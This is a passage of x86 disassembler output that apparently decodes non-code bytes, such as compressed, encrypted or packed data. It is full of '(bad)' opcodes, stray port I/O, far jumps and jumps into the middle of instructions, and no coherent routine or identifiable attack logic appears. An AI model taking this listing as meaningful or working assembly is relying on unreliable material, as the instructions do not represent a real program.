  40761d:	cmp    al,BYTE PTR [esi+0x3]
  407620:	dec    edx
  407621:	sub    ebx,esi
  407623:	retf   0xd0da
  407626:	jge    0x407622
  407628:	sbb    dl,0x78
  40762b:	stos   DWORD PTR es:[edi],eax
  40762c:	jae    0x4075e7
  40762e:	xchg   edx,eax
  40762f:	mov    ch,0x69
  407631:	pop    ds
  407632:	test   BYTE PTR [esi-0x379e3d07],dl
  407638:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407639:	mov    edx,0x98575066
  40763e:	xchg   ebx,eax
  40763f:	test   DWORD PTR [edx-0x5227c54a],0x5cfca1d3
  407649:	dec    edx
  40764a:	sbb    eax,0xe4bbc39f
  40764f:	mov    ds:0xa26b9620,eax
  407654:	xchg   ebx,eax
  407655:	cmp    eax,0xabeb694
  40765a:	dec    ebx
  40765b:	cld    
  40765c:	leave  
  40765d:	dec    ecx
  40765e:	ds mov ebp,0xe7f8b4df
  407664:	mov    al,ds:0x3d6e67a5
  407669:	xchg   ecx,eax
  40766a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40766b:	jge    0x4076e1
  40766d:	jle    0x4076e8
  40766f:	pusha  
  407670:	push   ebx
  407671:	xchg   ebp,eax
  407672:	sti    
  407673:	jo     0x407643
  407675:	std    
  407676:	mov    BYTE PTR [ecx+0x64],0xb3
  40767a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40767b:	out    dx,al
  40767c:	in     al,dx
  40767d:	call   0x5705:0xac5563b7
  407684:	sub    bl,ch
  407686:	out    dx,eax
  407687:	mov    ds:0x12de04b8,eax
  40768c:	xchg   edi,eax
  40768d:	sbb    edi,DWORD PTR [edx+esi*2+0x3d1b7d0e]
  407694:	push   cs
  407695:	fisub  WORD PTR [ecx]
  407697:	enter  0xfdf8,0x14
  40769b:	rcr    DWORD PTR [edx],1
  40769d:	mov    ch,0x6e
  40769f:	and    DWORD PTR [ebx-0x39cd0f51],0x37
  4076a6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4076a7:	inc    edi
  4076a8:	ficom  WORD PTR [eax+ebx*8+0x1739ca86]
  4076af:	xlat   BYTE PTR ds:[ebx]
  4076b0:	xlat   BYTE PTR ds:[ebx]
  4076b1:	jge    0x4076c5
  4076b3:	adc    dl,BYTE PTR [esi]
  4076b5:	std    
  4076b6:	sahf   
  4076b7:	ficomp WORD PTR [edi-0x549a0416]
  4076bd:	sub    DWORD PTR [ecx],eax
  4076bf:	aas    
  4076c0:	cli    
  4076c1:	dec    edi
  4076c2:	dec    edi
  4076c3:	pop    esp
  4076c4:	or     DWORD PTR [eax+0xc018691],0xd74cf9fb
  4076ce:	retf   
  4076cf:	xor    DWORD PTR [ebp+eax*8+0x77],esp
  4076d3:	inc    ebp
  4076d4:	mov    dh,BYTE PTR [edi+esi*2]
  4076d7:	xchg   esp,eax
  4076d8:	or     eax,0xe40e3f48
  4076dd:	rol    DWORD PTR ds:0xcc80857d,0x64
  4076e4:	dec    ebx
  4076e5:	das    
  4076e6:	mov    ch,BYTE PTR [esi]
  4076e8:	setns  BYTE PTR es:[eax]
  4076ec:	sbb    eax,0xb44be614
  4076f1:	mov    ds:0x90394f9d,al
  4076f6:	or     bl,0xf2
  4076f9:	dec    eax
  4076fa:	push   0x194dde44
  4076ff:	lods   eax,DWORD PTR ds:[esi]
  407700:	test   ah,dh
  407702:	sbb    DWORD PTR fs:[ecx+edx*1+0x653a7b9a],ebx
  40770a:	in     eax,0x2b
  40770c:	xor    edi,DWORD PTR [eax+0x4fadb99f]
  407712:	call   0x1cd7f757
  407717:	xor    DWORD PTR [ecx],esp
  407719:	pop    ebx
  40771a:	xchg   ecx,eax
  40771b:	mov    eax,ds:0x925a85df
  407720:	xlat   BYTE PTR ds:[ebx]
  407721:	outs   dx,BYTE PTR ds:[esi]
  407722:	pop    eax
  407723:	and    ebp,edx
  407725:	ret    
  407726:	out    dx,al
  407727:	or     BYTE PTR [edi-0x6a7acf60],0x8f
  40772e:	xchg   ecx,eax
  40772f:	fstp   TBYTE PTR [ecx+edx*4+0x7f]
  407733:	clc    
  407734:	mov    dh,0x6a
  407736:	pop    ss
  407737:	mov    ebp,0xcc0e5518
  40773c:	lahf   
  40773d:	scas   al,BYTE PTR es:[edi]
  40773e:	call   0xc5717d50
  407743:	pop    ss
  407744:	sar    BYTE PTR [esi],0xf3
  407747:	or     ch,BYTE PTR [edi-0x71]
  40774a:	mov    esi,0xc69098b0
  40774f:	cmp    cl,al
  407751:	popa   
  407752:	dec    esi
  407753:	or     BYTE PTR [eax],bh
  407755:	repnz push esp
  407757:	mov    esp,cs
  407759:	pop    ss
  40775a:	loopne 0x4077ca
  40775c:	test   BYTE PTR [esi+0x6c],dl
  40775f:	test   al,0x8c
  407761:	cmc    
  407762:	adc    edi,DWORD PTR [edx-0x2a772723]
  407768:	push   edx
  407769:	lock shl ecx,cl
  40776c:	ret    
  40776d:	test   al,0x70
  40776f:	jae    0x40770e
  407771:	mov    al,ds:0x3468c13c
  407776:	add    edi,ebp
  407778:	cs pop esi
  40777a:	jne    0x4077a6
  40777c:	jns    0x4077ea
  40777e:	out    0xbf,eax
  407780:	test   esi,0x71c4070
  407786:	jle    0x40778e
  407788:	jne    0x4077c3
  40778a:	ds fs and edi,esp
  40778e:	fsub   QWORD PTR [ecx+0x9]
  407791:	loop   0x4077a6
  407793:	mov    esi,0xc10728e6
  407798:	mov    WORD PTR [edx-0x5e],cs
  40779b:	jg     0x407755
  40779d:	jg     0x407755
  40779f:	outs   dx,DWORD PTR ds:[esi]
  4077a0:	test   BYTE PTR [edx-0xf],ah
  4077a3:	les    ebx,FWORD PTR [eax+edx*2+0x8c4881c]
  4077aa:	pop    edi
  4077ab:	jp     0x4077fd
  4077ad:	fwait
  4077ae:	pusha  
  4077af:	pusha  
  4077b0:	not    DWORD PTR [edi-0x6236e3ff]
  4077b6:	mov    DWORD PTR [ecx+0x68],eax
  4077b9:	pushf  
  4077ba:	(bad)
  4077be:	shr    BYTE PTR [edx],1
  4077c0:	fcmovnbe st,st(5)
  4077c2:	sub    dh,dh
  4077c4:	adc    dh,BYTE PTR [ecx-0x2a2618bd]
  4077ca:	stos   BYTE PTR es:[edi],al
  4077cb:	test   eax,0x458fd31b
  4077d0:	push   ebx
  4077d1:	cmp    al,0x59
  4077d3:	dec    edx
  4077d4:	out    dx,al
  4077d5:	js     0x40777b
  4077d7:	(bad)  
  4077d8:	idiv   BYTE PTR [ebp-0x30]
  4077db:	jg     0x407804
  4077dd:	(bad)  [ecx]
  4077df:	dec    esp
  4077e0:	mov    ecx,0xc7ff55f
  4077e5:	rcl    edx,1
  4077e7:	jnp    0x4077ec
  4077e9:	xor    bh,dh
  4077eb:	xor    al,al
  4077ed:	lods   eax,DWORD PTR ds:[esi]
  4077ee:	or     dh,BYTE PTR [edi-0x15cffa66]
  4077f4:	outs   dx,BYTE PTR ds:[esi]
  4077f5:	inc    esp
  4077f6:	pop    esp
  4077f7:	(bad)  
  4077f8:	sub    al,0xbe
  4077fa:	jbe    0x4077c0
  4077fc:	sub    al,0x92
  4077fe:	sbb    BYTE PTR [edi-0x5f54d385],ah
  407804:	or     al,0xdf
  407806:	stos   DWORD PTR es:[edi],eax
  407807:	cmp    BYTE PTR [ebx],al
  407809:	(bad)  
  40780a:	addr16 push 0x6efc66dc
  407810:	outs   dx,DWORD PTR ds:[esi]
  407811:	jo     0x407863
  407813:	mov    bh,0x80
  407815:	out    0x75,eax
  407817:	(bad)  
  407818:	lea    esi,[edx]
  40781a:	fistp  QWORD PTR [edi]
  40781c:	retf   
  40781d:	mov    ecx,0x43a2d23e
  407822:	adc    BYTE PTR [esi],al
  407824:	popf   
  407825:	int3   
  407826:	mov    edx,DWORD PTR [esi+0x5e]
  407829:	cmp    al,0x76
  40782b:	inc    edx
  40782c:	clc    
  40782d:	mov    bh,0xd7
  40782f:	jmp    0x4c60d3f9
  407834:	mov    al,0xe2
  407836:	push   esi
  407837:	xchg   ecx,eax
  407838:	sbb    DWORD PTR [edx+0x60a5ef26],esi
  40783e:	xor    BYTE PTR [ebx],al
  407840:	ins    DWORD PTR es:[edi],dx
  407841:	mov    bh,0x36
  407843:	pop    ds
  407844:	add    eax,0xe772f8bd
  407849:	and    eax,0xb9bb7ac5
  40784e:	in     al,dx
  40784f:	ins    DWORD PTR es:[edi],dx
  407850:	pop    eax
  407851:	imul   edi,DWORD PTR [ebx],0xb3aaf16a
  407857:	xor    ebx,DWORD PTR [esi-0x53edd3fd]
  40785d:	sti    
  40785e:	adc    dl,BYTE PTR [eax]
  407860:	test   eax,0xd0366614
  407865:	lahf   
  407866:	fidivr WORD PTR [edi]
  407868:	fiadd  WORD PTR [ebx+0x6e580132]
  40786e:	xchg   DWORD PTR [eax+edx*2],ecx
  407871:	sub    al,0xd1
  407873:	test   al,0x20
  407875:	dec    ebx
  407876:	mov    ch,0x31
  407878:	cmp    DWORD PTR [edi+eax*2-0x30937f76],ebp
  40787f:	cmp    ch,dl
  407881:	loop   0x4078b2
  407883:	cmp    eax,0xa7d10a19
  407888:	mov    DWORD PTR [edi],eax
  40788a:	pop    esi
  40788b:	int3   
  40788c:	push   ss
  40788d:	dec    edi
  40788e:	scas   eax,DWORD PTR es:[edi]
  40788f:	pop    edx
  407890:	repnz ins BYTE PTR es:[edi],dx
  407892:	mov    cl,BYTE PTR [edx]
  407894:	repz fnsave [ecx]
  407897:	ds (bad) 
  407899:	jmp    0x4078af
  40789b:	(bad)  
  40789c:	mov    ecx,0x802db6e3
  4078a1:	add    eax,0x9c6500f2
  4078a6:	call   0xc298:0x727aa8dc
  4078ad:	pop    esp
  4078ae:	and    bh,dl
  4078b0:	scas   eax,DWORD PTR es:[edi]
  4078b1:	ins    DWORD PTR es:[di],dx
  4078b3:	mov    ebx,0x575d2bec
  4078b8:	push   ds
  4078b9:	lods   eax,DWORD PTR ds:[esi]
  4078ba:	enter  0xe279,0x34
  4078be:	mov    ebp,0x9da91116
  4078c3:	pushf  
  4078c4:	push   eax
  4078c5:	jge    0x4078c1
  4078c7:	cmp    DWORD PTR [ebp-0x30],ecx
  4078ca:	xor    BYTE PTR [eax-0x4e73e192],bh
  4078d0:	fwait
  4078d1:	btr    DWORD PTR [edi],esp
  4078d4:	cmp    bh,BYTE PTR [ebx-0x66b05fcb]
  4078da:	push   cs
  4078db:	ffree  st(7)
  4078dd:	mov    DWORD PTR [edx-0x8],0x5da2b346
  4078e4:	neg    BYTE PTR [ebp+0x59]
  4078e7:	mov    eax,0x9b8cd04e
  4078ec:	or     ah,BYTE PTR [ebx+edi*8]
  4078ef:	mov    ds:0x6692f20,al
  4078f4:	les    esi,FWORD PTR [edi+0x5d48d8f1]
  4078fa:	jns    0x407885
  4078fc:	push   cs
  4078fd:	or     DWORD PTR [edi],esp
  4078ff:	xor    cl,BYTE PTR [ecx-0x57433505]
  407905:	ror    BYTE PTR [esp+ecx*2-0x677bc6da],1
  40790c:	imul   ebp,DWORD PTR gs:[esi-0x6d06d47e],0x9a973454
  407917:	fs out dx,eax
  407919:	pop    esi
  40791a:	imul   edx,edi,0x665a9c59
  407920:	jae    0x4078da
  407922:	lahf   
  407923:	out    0xf2,al
  407925:	mov    ebp,0xee572d1a
  40792a:	daa    
  40792b:	call   0x1a87a087
  407930:	adc    eax,0x7ec8d7c0
  407935:	(bad)  
  407937:	ficom  WORD PTR [edi+0x4a1634df]
  40793d:	mov    al,0x27
  40793f:	mov    esp,0xba351de8
  407944:	bound  edx,QWORD PTR [ecx]
  407946:	lock and BYTE PTR [edx-0x49],0x9c
  40794b:	dec    ebx
  40794c:	iret   
  40794d:	mov    eax,0x90588b92
  407952:	jg     0x4079b2
  407954:	sub    esi,esi
  407956:	inc    ebp
  407957:	in     al,dx
  407958:	iret   
  407959:	lahf   
  40795a:	adc    eax,0x3076b3b
  40795f:	fstp   DWORD PTR [esi+ebx*1+0x6c]
  407963:	xchg   ebx,eax
  407964:	aad    0x49
  407966:	sti    
  407967:	in     eax,dx
  407968:	pop    ebx
  407969:	mov    dl,0x53
  40796b:	daa    
  40796c:	(bad)  
  40796d:	push   eax
  40796e:	sbb    DWORD PTR [eax+0x2b44ae79],esp
  407974:	dec    ecx
  407975:	das    
  407976:	add    eax,0xc9b25cf7
  40797b:	or     bl,BYTE PTR [ebx]
  40797d:	out    0x5d,eax
  40797f:	cmp    BYTE PTR fs:[ebx],ah
  407982:	aas    
  407983:	adc    edx,edi
  407985:	push   esi
  407986:	ret    0x5a61
  407989:	lock aaa 
  40798b:	bound  edx,QWORD PTR [ebp-0x2000a2b7]
  407991:	ja     0x407995
  407993:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407994:	fild   DWORD PTR [esi]
  407996:	mov    bl,0x5c
  407998:	xchg   ecx,eax
  407999:	lea    ebp,[ebp-0x729fd65d]
  40799f:	repz fist DWORD PTR [ebx+0x24eeff13]
  4079a6:	lods   eax,DWORD PTR ds:[esi]
  4079a7:	test   BYTE PTR [edx-0x6aec3be5],0x3a
  4079ae:	iret   
  4079af:	xor    al,0xb
  4079b1:	add    DWORD PTR [ebp-0x30],0xffffffa4
  4079b5:	cmp    BYTE PTR [edi+0x25],bh
  4079b8:	out    0xe6,al
  4079ba:	dec    edx
  4079bb:	ins    DWORD PTR es:[edi],dx
  4079bc:	lea    edx,[esi-0x54]
  4079bf:	repnz adc al,0x7f
  4079c2:	ret    0x9adc
  4079c5:	add    dl,BYTE PTR [edx-0x4aba38a0]
  4079cb:	mov    cl,0x38
  4079cd:	lods   eax,DWORD PTR ds:[esi]
  4079ce:	cmp    al,0xf0
  4079d0:	jmp    0x4079c8
  4079d2:	test   BYTE PTR [eax+edi*8],ah
  4079d5:	cwde   
  4079d6:	cs pop edx
  4079d8:	cmp    DWORD PTR [esi+0x49],ebx
  4079db:	xchg   BYTE PTR [edx+eiz*8-0x79],bh
  4079df:	fmul   st,st(1)
  4079e1:	sbb    BYTE PTR [edi],cl
  4079e3:	add    al,0xef
  4079e5:	mov    al,ds:0x23861d5b
  4079ea:	mov    bh,0xfe
  4079ec:	push   esi
  4079ed:	das    
  4079ee:	push   edi
  4079ef:	clc    
  4079f0:	enter  0x135a,0x75
  4079f4:	aad    0x1b
  4079f6:	dec    edx
  4079f7:	sub    ch,BYTE PTR [ecx+0x5f]
  4079fa:	jmp    0x4079ba
  4079fc:	in     eax,dx
  4079fd:	loope  0x407a55
  4079ff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407a00:	inc    ecx
  407a01:	mov    ds:0xc92dd03,al
  407a06:	jbe    0x407997
  407a08:	dec    esi
  407a09:	sub    esi,ebp
  407a0b:	call   0xb6310c1a
  407a10:	jnp    0x4079ec
  407a12:	xchg   edx,esp
  407a14:	or     eax,0x92db6d05
  407a19:	pop    esi
  407a1a:	gs inc esi
  407a1c:	sahf   
  407a1d:	and    BYTE PTR [edx+0x5f],al
  407a20:	lock pop eax
  407a22:	das    
  407a23:	mov    bl,0xdb
  407a25:	push   eax
  407a26:	xor    al,BYTE PTR [ebx-0x19]
  407a29:	cmp    edx,DWORD PTR ds:0x17e3e31
  407a2f:	mov    ch,0x97
  407a31:	retf   
  407a32:	jnp    0x407a57
  407a34:	leave  
  407a35:	mov    ah,BYTE PTR [ebp-0x6f9b05fc]
  407a3b:	jns    0x407ab0
  407a3d:	mov    BYTE PTR [esi+0x36],al
  407a40:	(bad)  
  407a41:	aas    
  407a42:	sub    eax,DWORD PTR [edx]
  407a44:	mov    cl,0xd2
  407a46:	xchg   ebp,eax
  407a47:	icebp  
  407a48:	mov    al,ds:0x7f3b5343
  407a4d:	call   0x6245:0x9cd36d93
  407a54:	push   ss
  407a55:	push   0xffffffd7
  407a57:	stc    
  407a58:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407a59:	(bad)  [ebx]
  407a5b:	dec    edi
  407a5c:	pop    ss
  407a5d:	add    ch,BYTE PTR [edx-0x32]
  407a60:	jo     0x407a16
  407a62:	jmp    0x407a83
  407a64:	lahf   
  407a65:	scas   al,BYTE PTR es:[edi]
  407a66:	sbb    BYTE PTR [edi-0x3c],ah
  407a69:	out    dx,eax
  407a6a:	cmp    DWORD PTR [ecx-0x482ded6e],ecx
  407a70:	add    bh,BYTE PTR [esi+0x46a8b547]
  407a76:	inc    edi
  407a77:	inc    edi
  407a78:	aaa    
  407a79:	jle    0x407ae8
  407a7b:	mov    dl,dl
  407a7d:	mov    eax,ds:0x1c4b3f4a
  407a82:	out    dx,al
  407a83:	cmp    BYTE PTR [esi-0x6a],ah
  407a86:	jecxz  0x407af8
  407a88:	fdivr  st,st(0)
  407a8a:	xchg   BYTE PTR [edi-0x494e6e3c],dl
  407a90:	jmp    0xb7c7:0xae1b07c7
  407a97:	in     eax,0x6c
  407a99:	add    BYTE PTR [edx],al
  407a9b:	mov    esp,0x16bb3b05
  407aa0:	inc    edx
  407aa1:	cwde   
  407aa2:	or     BYTE PTR [eax+eax*1],ah
  407aa5:	pop    es
  407aa6:	mov    al,0xba
  407aa8:	inc    ebx
  407aa9:	pop    edx
  407aaa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407aab:	mov    ch,0x92
  407aad:	adc    DWORD PTR [esi],edx
  407aaf:	pop    esi
  407ab0:	sub    ch,ch
  407ab2:	lea    eax,[eax+0x14b6ae97]
  407ab8:	aas    
  407ab9:	into   
  407aba:	fisub  DWORD PTR [edi+0x4f]
  407abd:	sbb    dh,0x93
  407ac0:	es ss dec ebx
  407ac3:	imul   DWORD PTR [edx+0xf729174]
  407ac9:	sbb    bh,BYTE PTR [esi+0x3d5d4e5d]
  407acf:	scas   al,BYTE PTR es:[edi]
  407ad0:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  407ad2:	fsubrp st(1),st
  407ad4:	cmp    al,0xf1
  407ad6:	cdq    
  407ad7:	jmp    0xed36:0xd843a58e
  407ade:	rol    esi,cl
  407ae0:	aad    0x1a
  407ae2:	je     0x407b5d
  407ae4:	dec    edx
  407ae5:	jnp    0x407b0d
  407ae7:	std    
  407ae8:	aad    0xe5
  407aea:	sar    BYTE PTR [esi+0x50e840a0],cl
  407af0:	and    BYTE PTR [eax],dl
  407af2:	icebp  
  407af3:	ds xchg ebx,eax
  407af5:	mov    ds:0x2617ca97,al
  407afa:	aas    
  407afb:	inc    ebp
  407afc:	and    eax,0x3b859d52
  407b01:	sub    al,0x17
  407b03:	ins    BYTE PTR es:[edi],dx
  407b04:	push   eax
  407b05:	push   ecx
  407b06:	in     al,0xdb
  407b08:	fadd   QWORD PTR [ecx+0x6da3d5c3]
  407b0e:	pop    ecx
  407b0f:	or     edi,DWORD PTR [esi]
  407b11:	cli    
  407b12:	mov    ch,0x44
  407b14:	or     al,0xa5
  407b16:	and    ch,BYTE PTR [esi-0x62f47c93]
  407b1c:	imul   ebx,DWORD PTR [ecx+0x6c],0x3c96371b
  407b23:	xor    edx,DWORD PTR [esi-0x74]
  407b26:	fidiv  DWORD PTR [ecx+0x37]
  407b29:	ds hlt 
  407b2b:	push   ss
  407b2c:	push   ebp
  407b2d:	int    0x23
  407b2f:	dec    ebp
  407b30:	xchg   edx,eax
  407b31:	iret   
  407b32:	xor    DWORD PTR [esi],ebp
  407b34:	jno    0x407b46
  407b36:	jne    0x407b92
  407b38:	rcr    DWORD PTR ds:0x2d8dc626,cl
  407b3e:	fidivr WORD PTR [ecx]
  407b40:	add    al,0x71
  407b42:	push   esp
  407b43:	addr16 lock push edi
  407b46:	ins    BYTE PTR es:[edi],dx
  407b47:	xor    edx,DWORD PTR [esp+edi*1+0x130ee1b3]
  407b4e:	call   0x3df6:0x2c0673f3
  407b55:	xchg   edx,eax
  407b56:	add    cl,BYTE PTR [edi]
  407b58:	cs mov ebp,0x95c97b20
  407b5e:	jns    0x407bc6
  407b60:	add    DWORD PTR [ebx+0x6a],eax
  407b63:	push   esi
  407b64:	sub    DWORD PTR [ebp+0x6b3123eb],edx
  407b6a:	xor    eax,0x4e5d0aac
  407b6f:	into   
  407b70:	lea    edx,[esi+0x45]
  407b73:	mov    DWORD PTR [eax-0x596909],eax
  407b79:	mov    ecx,DWORD PTR [ecx+0x11]
  407b7c:	out    dx,eax
  407b7d:	aas    
  407b7e:	pop    esp
  407b7f:	out    dx,eax
  407b80:	call   0xc01a:0x3fbfb83a
  407b87:	mov    ebx,0xbc640182
  407b8c:	imul   eax,esp,0x3a
  407b8f:	retf   0x69a9
  407b92:	and    cl,dl
  407b94:	das    
  407b95:	shl    BYTE PTR [ecx+ecx*1],0xd2
  407b99:	add    ecx,DWORD PTR [ebx+0x1b]
  407b9c:	cmp    bl,BYTE PTR [ebx-0x9]
  407b9f:	out    dx,al
  407ba0:	ins    BYTE PTR es:[edi],dx
  407ba1:	inc    ebx
  407ba2:	popf   
  407ba3:	daa    
  407ba4:	push   eax
  407ba5:	xchg   edx,eax
  407ba6:	mov    edi,0x334fa06
  407bab:	and    ebp,DWORD PTR [edi+0x397f014a]
  407bb1:	sub    eax,0xcdeb2e87
  407bb6:	jbe    0x407c12
  407bb8:	sti    
  407bb9:	cmc    
  407bba:	jmp    0x2c01:0xcf29bb02
  407bc1:	in     al,dx
  407bc2:	bound  esp,QWORD PTR [eax]
  407bc4:	fwait
  407bc5:	ins    DWORD PTR es:[edi],dx
  407bc6:	ja     0x407c18
  407bc8:	jb     0x407bfe
  407bca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407bcb:	add    DWORD PTR [edi-0x48],esi
  407bce:	jecxz  0x407c35
  407bd0:	push   ebp
  407bd1:	cmp    ebp,edi
  407bd3:	or     ah,BYTE PTR [edi]
  407bd5:	(bad)  
  407bd6:	pop    edi
  407bd7:	out    dx,al
  407bd8:	inc    esi
  407bd9:	repnz pop edx
  407bdb:	and    ch,BYTE PTR [edi]
  407bdd:	mov    ah,0xf9
  407bdf:	or     esp,DWORD PTR [eax]
  407be1:	sahf   
  407be2:	mov    cl,0x4a
  407be4:	xor    ah,BYTE PTR [eax]
  407be6:	retf   
  407be7:	dec    ebx
  407be8:	fst    DWORD PTR [eax-0x60]
  407beb:	cwde   
  407bec:	push   ds
  407bed:	xor    DWORD PTR [eax+0x25],ebp
  407bf0:	mov    BYTE PTR [ecx-0x41ae72be],ah
  407bf6:	cmc    
  407bf7:	mov    cl,0x6d
  407bf9:	sbb    dh,cl
  407bfb:	push   edi
  407bfc:	mov    dh,BYTE PTR [esi]
  407bfe:	pop    ds
  407bff:	push   edi
  407c00:	pop    ebp
  407c01:	inc    ebp
  407c02:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407c03:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407c04:	add    ecx,edx
  407c06:	or     eax,0x9104e97e
  407c0b:	push   0xde04fa11
  407c10:	js     0x407c74
  407c12:	inc    esp
  407c13:	dec    esi
  407c14:	dec    ebp
  407c15:	ret    0x9fa4
  407c18:	add    al,0x7b
  407c1a:	add    ch,0x89
  407c1d:	lahf   
  407c1e:	xchg   esi,eax
  407c1f:	test   eax,eax
  407c21:	dec    ebx
  407c22:	mov    ds:0x657edc42,eax
  407c27:	outs   dx,BYTE PTR ds:[esi]
  407c28:	pop    esi
  407c29:	adc    eax,0x631a1353
  407c2e:	lds    ebp,FWORD PTR [esi-0x4]
  407c31:	push   eax
  407c32:	xchg   ah,cl
  407c34:	adc    eax,0xba36578e
  407c39:	mov    eax,ds:0xc10822a8
  407c3e:	or     DWORD PTR ds:0xd1090a41,edx
  407c44:	inc    eax
  407c45:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407c46:	dec    edx
  407c47:	clc    
  407c48:	xchg   edi,eax
  407c49:	mov    ?,esi
  407c4b:	mov    ebp,0xa1e6b3c5
  407c50:	inc    edi
  407c51:	adc    ecx,DWORD PTR [eax]
  407c53:	add    cl,BYTE PTR [ecx]
  407c55:	out    dx,eax
  407c56:	jl     0x407bf8
  407c58:	cmp    BYTE PTR [ebx-0x1f],dh
  407c5b:	adc    esi,esp
  407c5d:	cs fsubrp st(4),st
  407c60:	shl    BYTE PTR [edx+0x5a],0xe5
  407c64:	xor    bl,cl
  407c66:	jmp    0xedd94ce4
  407c6b:	adc    bh,dh
  407c6d:	or     DWORD PTR [ecx-0x2b],ebp
  407c70:	pop    ebp
  407c71:	dec    eax
  407c72:	or     ch,BYTE PTR [eax+0x71]
  407c75:	je     0x407ca6
  407c77:	add    al,0x37
  407c79:	pop    DWORD PTR [edx+0x5a904ad5]
  407c7f:	cmc    
  407c80:	rcl    ch,cl
  407c82:	xchg   ax,ax
  407c84:	lahf   
  407c85:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407c86:	cmc    
  407c87:	stos   DWORD PTR es:[edi],eax
  407c88:	jg     0x407cdb
  407c8a:	inc    ebx
  407c8b:	mov    ds:0xb42e85db,al
  407c90:	in     al,dx
  407c91:	sar    bh,cl
  407c93:	mov    DWORD PTR [esi-0x38eb40f5],edx
  407c99:	cmp    bh,ah
  407c9b:	fwait
  407c9c:	and    al,0xc
  407c9e:	dec    ebx
  407c9f:	scas   al,BYTE PTR es:[edi]
  407ca0:	dec    ebx
  407ca1:	fwait
  407ca2:	push   esp
  407ca3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407ca4:	pop    edi
  407ca5:	cmp    esi,DWORD PTR [edx]
  407ca7:	mov    dl,0x1e
  407ca9:	sahf   
  407caa:	mov    esi,0x99a6a8c4
  407caf:	out    dx,al
  407cb0:	jp     0x407c69
  407cb2:	cmp    dh,BYTE PTR [ecx]
  407cb4:	adc    al,0xfd
  407cb6:	test   al,0x87
  407cb8:	adc    DWORD PTR [esi+0x2e47c8e1],edi
  407cbe:	ficomp WORD PTR [edi]
  407cc0:	mov    cl,0xde
  407cc2:	loope  0x407d29
  407cc4:	dec    edi
  407cc5:	out    0xfd,eax
  407cc7:	mov    esp,0xe3a4b338
  407ccc:	out    0x54,eax
  407cce:	outs   dx,BYTE PTR ds:[esi]
  407ccf:	mov    edx,0xedb3fa93
  407cd4:	pop    ecx
  407cd5:	cmp    edi,esi
  407cd7:	xchg   ebx,eax
  407cd8:	mov    bh,0x6f
  407cda:	cmp    edi,DWORD PTR ds:0xd2587d99
  407ce0:	add    BYTE PTR [ecx+0x76],0x56
  407ce4:	sub    BYTE PTR [ebp-0x43],0xcf
  407ce8:	pop    ss
  407ce9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407cea:	push   esp
  407ceb:	pop    esp
  407cec:	nop
  407ced:	push   ebp
  407cee:	(bad)  
  407cef:	out    dx,eax
  407cf0:	arpl   WORD PTR [ebp-0x5cc8151c],sp
  407cf6:	aad    0x69
  407cf8:	and    al,dl
  407cfa:	test   DWORD PTR [eax-0x62143e5e],edi
  407d00:	pop    ds
  407d01:	bound  esi,QWORD PTR [ebp-0x7d]
  407d04:	push   esi
  407d05:	or     ah,al
  407d07:	lahf   
  407d08:	int    0x13
  407d0a:	cmc    
  407d0b:	push   cs
  407d0c:	inc    ecx
  407d0d:	enter  0xed58,0x3f
  407d11:	fwait
  407d12:	and    BYTE PTR [edi+0xd],dl
  407d15:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407d16:	push   eax
  407d17:	test   DWORD PTR [ecx],ebx
  407d19:	add    eax,0xba2cb2fa
  407d1e:	lea    ebx,[edi]
  407d20:	mov    ah,0x6d
  407d22:	lahf   
  407d23:	push   0xe263d433
  407d28:	adc    DWORD PTR [edi+0xc],0x94e7e533
  407d2f:	pushf  
  407d30:	mov    dl,0xbd
  407d32:	push   ebp
  407d33:	mov    eax,ds:0x511779f0
  407d38:	dec    edx
  407d39:	cdq    
  407d3a:	dec    edi
  407d3b:	mov    bl,0x1b
  407d3d:	lods   al,BYTE PTR ds:[esi]
  407d3e:	into   
  407d3f:	or     BYTE PTR [edx],0x7a
  407d42:	mov    BYTE PTR [ecx-0x7c914981],bh
  407d48:	push   edi
  407d49:	cmc    
  407d4a:	out    dx,al
  407d4b:	pop    es
  407d4c:	xor    ebx,edi
  407d4e:	push   cs
  407d4f:	sub    al,0x2d
  407d51:	ret    0x3210
  407d54:	jecxz  0x407d9e
  407d56:	mov    ecx,esp
  407d58:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407d59:	dec    edx
  407d5a:	jnp    0x407da1
  407d5c:	sub    ch,BYTE PTR [ecx-0x29]
  407d5f:	adc    esi,DWORD PTR [edi+edx*2-0x10]
  407d63:	ja     0x407d59
  407d65:	call   0xf6a3:0x9b416c99
  407d6c:	add    al,0xb6
  407d6e:	gs test eax,0x17b10fb4
  407d74:	in     eax,dx
  407d75:	cs nop
  407d77:	push   ss
  407d78:	sbb    ah,BYTE PTR [ebx+0x1fca1975]
  407d7e:	cmp    eax,0x3144851d
  407d83:	cdq    
  407d84:	es jo  0x407d53
  407d87:	push   edx
  407d88:	inc    edi
  407d89:	rcl    DWORD PTR [eax+0x1e081558],0x56
  407d90:	pusha  
  407d91:	jmp    0x418bcb29
  407d96:	sub    DWORD PTR [esi-0x2fcdee54],edi
  407d9c:	pop    edi
  407d9d:	iret   
  407d9e:	jnp    0x407d3a
  407da0:	cmp    BYTE PTR [eax],ch
  407da2:	push   ecx
  407da3:	jno    0x407dfd
  407da5:	dec    eax
  407da6:	lock bound esp,QWORD PTR [ebx+0x35]
  407daa:	das    
  407dab:	add    DWORD PTR [eax-0x4d],edx
  407dae:	mov    bh,0x11
  407db0:	cvtdq2ps xmm2,xmm0
  407db3:	pop    ecx
  407db4:	int    0x1b
  407db6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
